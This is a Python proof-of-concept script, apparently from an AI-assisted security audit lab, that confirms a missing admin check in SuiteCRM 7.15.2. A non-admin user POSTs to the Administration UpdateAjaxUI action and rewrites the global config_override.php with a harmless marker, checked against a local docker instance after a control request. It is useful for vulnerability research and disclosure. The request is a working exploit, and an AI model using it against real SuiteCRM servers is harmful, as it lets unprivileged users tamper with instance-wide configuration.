#!/usr/bin/env python3
"""
VULN-034 -- Non-admin writes to global config (config_override.php) via
            ungated Administration/Configurator actions

Target:   SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sink:     modules/Administration/controller.php:146-155 (action_UpdateAjaxUI)
              writes $sugar_config['addAjaxBannedModules'] then calls
              Configurator::handleOverride() -- NO is_admin() check anywhere
              in the method body.
Control:  modules/Administration/controller.php:56-58 (action_savetabs) DOES
              gate on `if (!is_admin($current_user)) { sugar_die(...); }` --
              used here as the "what secure looks like" baseline.

What this script does
----------------------
1. Logs in as admin, creates one fresh low-priv (non-admin) user U.
2. As U: sends the SAME kind of POST to the admin-gated sibling action
   `savetabs` and confirms it is rejected (ERR_NOT_ADMIN / no admin UI) --
   this is the in-lab control proving admin gating *does* work when present.
3. As U: POSTs to the ungated `UpdateAjaxUI` action with a harmless,
   random-suffixed marker module name in `disabled_modules`.
4. Verifies the REAL security effect: `docker compose exec app cat
   config_override.php` shows `addAjaxBannedModules` now contains the
   attacker-chosen marker string -- i.e. a non-admin user durably rewrote
   global, instance-wide configuration.

Environment variables (defaults match claude_audit/SuiteCRM/SuiteCRM_summary.md):
    BASE_URL       (default http://localhost:33116)
    ADMIN_USER     (default admin)
    ADMIN_PASS     (default Admin@2026!)
    COMPOSE_PROJECT (default cvehunterlab_suitecrm)

Exit code 0 + "[OK]" on CONFIRMED, non-zero + "[FAIL]" otherwise.
"""
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, admin_session, create_user, web_login)

VULN_ID = "VULN-034"
HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT", "cvehunterlab_suitecrm")


def save_evidence(request_txt, response_obj):
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(request_txt)
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {response_obj.status_code} {response_obj.reason}\n")
        for k, v in response_obj.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n")
        f.write(response_obj.text[:20000])


def read_config_override():
    """Read config_override.php from the running app container via docker compose exec."""
    r = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "app",
         "cat", "/var/www/html/config_override.php"],
        capture_output=True, text=True, timeout=30,
    )
    return r.stdout


def main():
    banner(VULN_ID, "non-admin write to global config_override.php via ungated UpdateAjaxUI")

    log("SETUP", "admin web login")
    admin = admin_session()

    log("SETUP", "provisioning a single low-priv (non-admin) user U")
    u = create_user(admin, "Marker@2026x!")
    log("INFO", f"U = {u['user_name']} ({u['id']})")

    us = web_login(u["user_name"], u["password"])

    # ---- Control: admin-gated sibling action_savetabs must reject a non-admin ----
    log("STEP", "control: U POSTs to the admin-gated sibling action=savetabs")
    ctrl = us.post(
        f"{BASE_URL}/index.php",
        data={"module": "Administration", "action": "savetabs",
              "enabled_tabs": "[]", "disabled_tabs": "[]"},
        headers={"Referer": f"{BASE_URL}/index.php?module=Administration&action=index"},
        allow_redirects=False, timeout=30,
    )
    ctrl_body = ctrl.text
    log("INFO", f"control response: status={ctrl.status_code} len={len(ctrl_body)} "
                f"contains 'ERR_NOT_ADMIN' marker: {'not an administrator' in ctrl_body.lower() or 'not_admin' in ctrl_body.lower()}")
    with open(os.path.join(HERE, "evidence", "control_savetabs_response.txt"), "w") as f:
        f.write(f"status={ctrl.status_code}\n\n{ctrl_body[:5000]}")

    # ---- Attack: ungated action_UpdateAjaxUI ----
    marker_module = rand("StageTenBannedModule")
    log("STEP", f"attack: U (non-admin) POSTs action=UpdateAjaxUI with marker module {marker_module!r}")
    params = {"module": "Administration", "action": "UpdateAjaxUI"}
    body = {"disabled_modules": f'["{marker_module}"]'}
    request_txt = (
        f"POST /index.php?module=Administration&action=UpdateAjaxUI HTTP/1.1\n"
        f"Host: localhost:33116\n"
        f"Cookie: PHPSESSID=<U-session (non-admin)>\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Referer: {BASE_URL}/index.php?module=Administration&action=index\n\n"
        f"disabled_modules=[\"{marker_module}\"]\n"
    )
    r = us.post(f"{BASE_URL}/index.php", params=params, data=body,
                headers={"Referer": f"{BASE_URL}/index.php?module=Administration&action=index"},
                allow_redirects=False, timeout=30)
    save_evidence(request_txt, r)
    log("INFO", f"attack response status={r.status_code}")

    # ---- Verify real effect: config_override.php on disk ----
    log("PROOF", "reading config_override.php from the app container")
    cfg = read_config_override()
    with open(os.path.join(HERE, "evidence", "config_override_after.php"), "w") as f:
        f.write(cfg)

    landed = marker_module in cfg and "addAjaxBannedModules" in cfg
    log("PROOF", f"marker {marker_module!r} present under 'addAjaxBannedModules' in config_override.php: {landed}")
    if not landed:
        verdict(VULN_ID, "FAILED", "marker did not land in config_override.php")
        sys.exit(1)

    # Extract the decisive line(s) for the record
    decisive = "\n".join(ln for ln in cfg.splitlines() if "addAjaxBannedModules" in ln or marker_module in ln)
    log("PROOF", f"decisive config_override.php excerpt: {decisive}")

    log("OK", "non-admin user U durably rewrote global config_override.php")
    verdict(VULN_ID, "CONFIRMED",
            f"non-admin wrote addAjaxBannedModules containing {marker_module} into config_override.php")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
